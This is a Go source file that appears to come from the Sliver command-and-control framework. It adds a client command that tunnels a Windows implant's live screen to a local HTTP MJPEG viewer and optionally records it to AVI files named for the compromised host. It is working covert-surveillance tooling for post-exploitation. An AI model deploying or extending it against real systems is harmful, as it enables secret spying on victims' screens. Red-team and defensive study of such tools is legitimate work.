package screenshare

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"github.com/gorilla/mux"
	mjpeg2 "github.com/icza/mjpeg"
	"github.com/mattn/go-mjpeg"
	"image"
	"net"
	"net/http"
	"os"
	"path"
	"time"
)

const (
	defaultRecordInterval = time.Minute * 5
	defaultHTTPTimeout    = time.Second * 60
)

var (
	status bool
)

// ScreenshareAdd - Take a screenshot of the remote system
func ScreenshareAdd(c *grumble.Context, con *console.SliverConsoleClient) {
	// 1、发送建立视频监控流程
	// 2、建立成功后，监听本地端口，将数据流导出
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	if session.OS != "windows" {
		con.PrintErrorf("Not implemented for %s\n", session.OS)
		return
	}
	hostPort := c.Flags.String("hostPort")
	recording := c.Flags.Bool("recording")
	ln, err := net.Listen("tcp", hostPort)
	if err != nil {
		con.PrintErrorf("Port occupation reselect! \n")
		return
	}
	ln.Close()

	rpcTunnel, err := con.Rpc.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	if err != nil {
		con.PrintErrorf("[tcpproxy] Failed to dial implant %s", err)
		return
	}
	//con.PrintErrorf("[tcpproxy] Created new tunnel with id %d (session %d)", rpcTunnel.TunnelID, session.ID)
	tunnel := core.Tunnels.Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

	rpcSocks, err := con.Rpc.CreateScreenShare(context.Background(), &sliverpb.ScreenShare{
		SessionID: session.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	shareStream, err := con.Rpc.ScreenShare(context.Background(), &sliverpb.ScreenShareData{
		TunnelID: rpcSocks.TunnelID,
		Request: &commonpb.Request{
			SessionID: session.ID,
		},
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	number := uint32(len(ScreenShares) + 1)
	stream := mjpeg.NewStream()
	var awr mjpeg2.AviWriter
	go func() {
		for {
			recv, err := shareStream.Recv()
			if err != nil {
				return
			}
			fmt.Println("Registering stream", len(recv.Data), tunnel.ID)
			uploadGzip, _ := new(encoders.Gzip).Decode(recv.Data)
			if recording && !status && awr == nil {
				timestamp := time.Now().Format("20060102150405")
				tmpFileName := path.Base(fmt.Sprintf("screenshare_%s_%d_%s.avi", session.Name, session.ID, timestamp))
				tmpFilePath := fmt.Sprintf("%s/output/%s/", assets.GetRootAppDir(), session.Hostname)
				if _, err := os.Stat(tmpFilePath); os.IsNotExist(err) {
					os.MkdirAll(tmpFilePath, 0700)
				}
				OneImage, _, err := image.DecodeConfig(bytes.NewReader(uploadGzip))
				if err != nil {
					con.PrintErrorf("err1 = %s", err.Error())
					return
				}
				fmt.Println("write file path -> ", tmpFileName)
				awr, err = mjpeg2.New(tmpFilePath+tmpFileName, int32(OneImage.Width), int32(OneImage.Height), 30)
				if err == nil {
					status = true
					go func() {
						ticker := time.NewTicker(defaultRecordInterval)
						for {
							select {
							case <-ticker.C:
								awr.Close()
								ticker.Stop()
								status = false
								break
							}
						}
					}()
				}
			} else if recording && awr != nil {
				awr.AddFrame(uploadGzip)
			}
			err = stream.Update(uploadGzip)
			if err == errors.New("stream was closed") {
				return
			}
		}
	}()

	router := mux.NewRouter()
	router.HandleFunc(fmt.Sprintf("/mjpeg"), stream.ServeHTTP)
	router.HandleFunc("/watch", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title> Screen </title>
	</head>
		<body style="margin:0">
	<img src="/mjpeg" style="max-width: 100vw; max-height: 100vh;object-fit: contain;display: block;margin: 0 auto;" />
</body>`))
	})
	server := &http.Server{
		Addr:         hostPort,
		Handler:      router,
		WriteTimeout: defaultHTTPTimeout,
		ReadTimeout:  defaultHTTPTimeout,
		IdleTimeout:  defaultHTTPTimeout,
	}
	go func() {
		con.PrintInfof("Start listening %s\n\n", server.Addr)
		err := server.ListenAndServe()
		if err != nil {
			con.PrintErrorf("%s", err)
			ScreenShares[number].Cleanup()
		}
	}()

	ScreenShares[number] = &ScreenTask{
		ID:        number,
		SessionID: session.ID,
		Display:   uint32(0),
		Server:    server,
		Recording: recording,
		Cleanup: func() {
			if awr != nil {
				awr.Close()
			}
			if stream != nil {
				stream.Close()
			}
			if shareStream != nil {
				err := shareStream.CloseSend()
				if err != nil {
					con.Println(err.Error())
				}
			}
			if server != nil {
				ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
				defer cancelHTTP()
				if err := server.Shutdown(ctx); err != nil {
					con.Println("Failed to shutdown http acme server")
				}
			}
			_, err := con.Rpc.ScreenShare(context.Background(), &sliverpb.ScreenShareData{
				Type:     sliverpb.MsgTunnelClose,
				TunnelID: rpcSocks.TunnelID,
				Request: &commonpb.Request{
					SessionID: session.ID,
				},
			})
			if err != nil {
				con.PrintErrorf("11 ScreenShare %s\n", err)
				return
			}

		},
	}
}
